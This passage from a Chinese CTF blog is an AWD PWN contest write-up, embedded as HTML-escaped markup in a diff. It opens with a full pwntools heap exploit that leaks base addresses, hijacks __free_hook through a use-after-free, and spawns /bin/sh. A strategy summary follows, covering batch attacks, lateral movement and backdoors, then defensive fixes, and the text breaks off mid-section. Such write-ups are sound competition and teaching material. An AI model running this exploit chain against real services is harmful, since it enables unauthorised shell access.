+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;piebase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4008&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;piebase: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;piebase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. 创建 6 个马匹堆块（索引 0-2、5-7）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 3. 泄露堆基址：释放索引 0、1，通过 show(1) 读取残留堆地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;heap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x260&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;heap: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 4. 篡改堆块指针：通过 naming(1) 覆盖为 PIE 内数据地址，泄露 libc 基址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;naming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;piebase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4020&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libcbase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3ec760&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;libcbase: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libcbase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 5. 劫持 __free_hook：通过 UAF 漏洞篡改指针，写入 system 地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;naming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libcbase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;naming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libcbase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 6. 触发 system(&amp;#34;/bin/sh&amp;#34;)：命名索引 7 为 /bin/sh，释放时执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;naming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 交互获取 shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;不足之处&#34;&gt;不足之处
+&lt;/h2&gt;&lt;p&gt;我去&amp;hellip;第一次接触PWN-AWD，是真坐牢，什么都不会，看到free我就知道这下午肯定坐牢了&amp;hellip;&lt;/p&gt;
+&lt;p&gt;附件： &lt;a class=&#34;link&#34; href=&#34;awd.7z&#34; &gt;awd.7z&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;第一次连，scp都连不上，多亏群主相助。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1.png&#34;
+	width=&#34;1055&#34;
+	height=&#34;149&#34;
+	srcset=&#34;https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1_hu_10d5ac0ad9e3493f.png 480w, https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1_hu_f6405d7dde736fb6.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;708&#34;
+		data-flex-basis=&#34;1699px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2.png&#34;
+	width=&#34;726&#34;
+	height=&#34;469&#34;
+	srcset=&#34;https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2_hu_daf2b2690c7ed50f.png 480w, https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2_hu_85c7f90fca397930.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;程序运行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;371px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;总结&#34;&gt;总结
+&lt;/h2&gt;&lt;p&gt;AWD 中的 PWN 选手是 “攻防双核心”，既要能快速打穿对手拿分，又要能守住己方不丢分，其表现直接影响团队的最终排名。&lt;/p&gt;
+&lt;h3 id=&#34;攻击端任务打穿对手拿-flag-得分&#34;&gt;攻击端任务：“打穿对手，拿 flag 得分”
+&lt;/h3&gt;&lt;p&gt;攻击是 AWD 的核心得分手段，PWN 选手需在比赛初期快速完成 “漏洞挖掘→EXP 编写→批量攻击→flag 提交” 的闭环，具体步骤如下：&lt;/p&gt;
+&lt;h4 id=&#34;1-漏洞挖掘快速定位可利用漏洞&#34;&gt;1. 漏洞挖掘：快速定位可利用漏洞
+&lt;/h4&gt;&lt;p&gt;比赛会为每个队伍提供相同的 PWN 程序（源码或二进制文件），PWN 选手需第一时间分析程序漏洞，重点关注：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;高危漏洞优先&lt;/strong&gt;：优先挖掘可直接获取 Shell 的漏洞（如栈溢出、堆溢出、UAF、函数指针劫持等），其次是信息泄露漏洞（如格式化字符串、未初始化内存泄露，用于辅助获取 libc 基址、PIE 基址等）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;结合程序逻辑&lt;/strong&gt;：针对 AWD 常见的 PWN 程序类型（如菜单式程序、文件操作程序、网络服务程序），重点检查 “输入处理”（如&lt;code&gt;gets&lt;/code&gt;/&lt;code&gt;strcpy&lt;/code&gt;无长度限制）、“内存管理”（如 free 后未置空指针、堆块重叠）、“功能调用”（如可控函数指针、系统命令调用）等环节；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;工具辅助&lt;/strong&gt;：用&lt;code&gt;IDA Pro&lt;/code&gt;/&lt;code&gt;Ghidra&lt;/code&gt;反编译二进制文件，&lt;code&gt;checksec&lt;/code&gt;查看保护机制（PIE、RELRO、Stack Canary、NX），&lt;code&gt;gdb&lt;/code&gt;动态调试验证漏洞触发条件。&lt;/p&gt;
+&lt;h4 id=&#34;2-exp-编写高效生成攻击脚本&#34;&gt;2. EXP 编写：高效生成攻击脚本
+&lt;/h4&gt;&lt;p&gt;漏洞确认后，需编写自动化 Exploit（EXP）脚本，核心要求是&lt;strong&gt;稳定、通用&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;适配保护机制：&lt;/p&gt;
+&lt;p&gt;1、若开启 PIE（地址随机化）：通过信息泄露漏洞（如 show 函数泄露）获取基址，动态计算目标地址；&lt;/p&gt;
+&lt;p&gt;2、若开启 Stack Canary：判断是否可绕过（如通过 UAF 泄露 Canary 值），或优先选择无 Canary 保护的漏洞点；&lt;/p&gt;
+&lt;p&gt;3、若开启 NX（栈不可执行）：构造 ROP 链调用&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;，或劫持&lt;code&gt;__free_hook&lt;/code&gt;/&lt;code&gt;__malloc_hook&lt;/code&gt;；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;自动化交互&lt;/strong&gt;：用&lt;code&gt;pwntools&lt;/code&gt;库封装程序交互逻辑（如菜单选择、输入发送、结果接收），确保 EXP 能自动完成 “连接目标→触发漏洞→获取 Shell→读取 flag” 的全流程；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;批量攻击适配&lt;/strong&gt;：比赛中需攻击多个对手 IP（通常是 C 段或指定 IP 列表），EXP 需支持批量读取 IP 列表、多线程攻击，提升攻击效率。&lt;/p&gt;
+&lt;h4 id=&#34;3-漏洞利用获取-shell-与-flag&#34;&gt;3. 漏洞利用：获取 Shell 与 flag
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;远程攻击&lt;/strong&gt;：通过 EXP 连接对手服务器的 PWN 程序端口，触发漏洞获取 Shell（如&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag 读取&lt;/strong&gt;：AWD 比赛中，flag 通常存放在固定路径（如&lt;code&gt;/home/flag.txt&lt;/code&gt;、&lt;code&gt;/tmp/flag&lt;/code&gt;），获取 Shell 后执行&lt;code&gt;cat 路径&lt;/code&gt;读取 flag，按比赛要求提交（如 POST 到指定接口、写入己方 flag 存储目录）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;横向扩展&lt;/strong&gt;：若获取的 Shell 权限较高（如 root），可进一步横向渗透（如查看其他服务、种植后门），但需注意比赛规则（部分比赛禁止破坏对手服务器）。&lt;/p&gt;
+&lt;h4 id=&#34;4-对抗性优化应对对手防御&#34;&gt;4. 对抗性优化：应对对手防御
+&lt;/h4&gt;&lt;p&gt;随着比赛推进，对手会修复漏洞，PWN 选手需调整攻击策略：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;多漏洞备份&lt;/strong&gt;：若主漏洞被修复，快速切换到备用漏洞（如主漏洞是栈溢出，备用漏洞是格式化字符串）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;绕过修复&lt;/strong&gt;：分析对手的修复逻辑（如简单添加长度检查），寻找绕过方法（如利用修复漏洞的逻辑缺陷，或构造特殊输入绕过检查）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;0day 储备&lt;/strong&gt;：若提前挖掘到未被普遍发现的漏洞（0day），可在后期对手放松防御时集中攻击，获取大量分数。&lt;/p&gt;
+&lt;h3 id=&#34;防御端任务修复漏洞守住己方服务器&#34;&gt;防御端任务：“修复漏洞，守住己方服务器”
+&lt;/h3&gt;&lt;p&gt;防御的核心是 “不让对手利用己方 PWN 程序漏洞”，需在攻击的同时快速完成漏洞修复，避免丢分：&lt;/p&gt;
+&lt;h4 id=&#34;1-漏洞修复针对性修补漏洞点&#34;&gt;1. 漏洞修复：针对性修补漏洞点
+&lt;/h4&gt;&lt;p&gt;根据攻击端挖掘的漏洞，对己方 PWN 程序进行最小化修复（避免过度修改导致程序无法运行），常见修复方式：&lt;/p&gt;
+&lt;p&gt;栈溢出 / 堆溢出修复：&lt;/p&gt;
+&lt;p&gt;替换危险函数（如&lt;code&gt;gets&lt;/code&gt;→&lt;code&gt;fgets&lt;/code&gt;、&lt;code&gt;strcpy&lt;/code&gt;→&lt;code&gt;strncpy&lt;/code&gt;），严格限制输入长度；&lt;/p&gt;
+&lt;p&gt;对堆操作添加边界检查（如检查&lt;code&gt;index&lt;/code&gt;是否在合法范围、堆块大小是否合理）；&lt;/p&gt;
+&lt;p&gt;格式化字符串漏洞修复：&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;printf(user_input)&lt;/code&gt;改为&lt;code&gt;printf(&amp;quot;%s&amp;quot;, user_input)&lt;/code&gt;，避免用户可控内容作为格式字符串；&lt;/p&gt;
+&lt;p&gt;UAF 漏洞修复：&lt;/p&gt;
+&lt;p&gt;free&lt;code&gt;内存后将指针置空（如&lt;/code&gt;free(list[index]); list[index] = NULL&lt;code&gt;），后续使用前检查指针是否为&lt;/code&gt;NULL`；&lt;/p&gt;
+&lt;p&gt;函数指针劫持修复：&lt;/p&gt;
